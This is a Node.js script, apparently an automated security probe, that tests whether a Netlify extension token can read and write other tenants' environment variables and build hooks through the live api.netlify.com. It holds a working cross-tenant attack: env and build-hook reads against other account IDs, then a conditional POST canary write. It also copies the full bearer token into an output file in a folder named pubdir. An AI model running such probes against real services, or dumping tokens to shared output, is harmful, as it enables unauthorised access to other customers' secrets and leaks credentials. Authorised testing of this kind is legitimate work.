// agentdeep-9 — extension_token + Api-Version:2 authz matrix (Lane A sub-lane d).
// The extension SDK client (extension-api-client 3.0.2) calls core api.netlify.com
// /api/v1 with Bearer <extension_token> + Api-Version: 2, passing FREE accountId/siteId
// params to /accounts/{id}/env?site_id=. Q: does the server bind the token to its
// owner site (nl2 3e3ae2e4) or accept arbitrary ids (cross-tenant env read/write)?
// Cross cells target OUR nl3 throwaway tenant. Canary WRITE only fires if the cross
// READ returns 200 — bounded, reversible (we own nl3).
import fs from 'node:fs';

const R = { probe: 'agentdeep-9', t: new Date().toISOString() };
const cap = (v, n = 1200) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC' : v);
const flush = () => { try { fs.writeFileSync('pubdir/agentdeep9.json', JSON.stringify(R, null, 1)); } catch {} };
fs.mkdirSync('pubdir', { recursive: true });

const NL2_SITE = '3e3ae2e4-3021-46a1-8400-4898f2dd07cb';
const NL2_ACC = '6a57be1beaa1dc73c8b2cd88';
const NL3_SITE = '26743cb0-18b1-4de7-a09d-87c093d5e16a';
const NL3_CORE = '6ad77c2ddb8a7fbc75196c4b';
const NL3_CREATE = '6ad77c2e5ee1abec2f63e74a';

const cfg = JSON.parse(fs.readFileSync('/tmp/netlify_config.json', 'utf8'));
const tok = (cfg.integrations || []).find((i) => i.extension_token)?.extension_token || '';
R.tokLen = tok.length; R.tokFull = tok; // our own throwaway token, 24h TTL
flush();

const H = { Authorization: 'Bearer ' + tok, 'Api-Version': '2', Accept: 'application/json', 'Content-Type': 'application/json' };
const call = async (tag, path, opts = {}) => {
  try {
    const r = await fetch('https://api.netlify.com' + path, { ...opts, headers: H });
    const body = await r.text();
    R[tag] = { s: r.status, body: cap(body) };
  } catch (e) { R[tag] = { err: String(e).slice(0, 140) }; }
  flush();
  return R[tag];
};

// whoami + site listing under extension auth
await call('user', '/api/v1/user');
await call('sitesList', '/api/v1/sites');

// CONTROL: own account/site env via the SDK's exact shape
await call('ownEnv', `/api/v1/accounts/${NL2_ACC}/env?site_id=${NL2_SITE}`);

// CROSS (our nl3 tenant): env read for nl3 site under nl3 orgs
const x1 = await call('xtEnvNl3Core', `/api/v1/accounts/${NL3_CORE}/env?site_id=${NL3_SITE}`);
const x2 = await call('xtEnvNl3Create', `/api/v1/accounts/${NL3_CREATE}/env?site_id=${NL3_SITE}`);
// cross account-level env (no site_id) — team env vars
await call('xtEnvAccOnlyCore', `/api/v1/accounts/${NL3_CORE}/env`);
// cross build_hooks read (secrets-ish: build hook URLs)
await call('xtHooksNl3', `/api/v1/sites/${NL3_SITE}/build_hooks`);

// gated canary write: ONLY if a cross env read returned 200
if ((x1 && x1.s === 200) || (x2 && x2.s === 200)) {
  const acc = x1 && x1.s === 200 ? NL3_CORE : NL3_CREATE;
  await call('xtEnvCanaryWrite', `/api/v1/accounts/${acc}/env?site_id=${NL3_SITE}`, {
    method: 'POST',
    body: JSON.stringify([{ key: 'XT_EXTTOKEN_CANARY', values: [{ value: 'agentdeep9-' + Date.now(), context: 'all' }], is_secret: false }]),
  });
}

R.done = new Date().toISOString();
flush();
console.log('agentdeep-9 done');
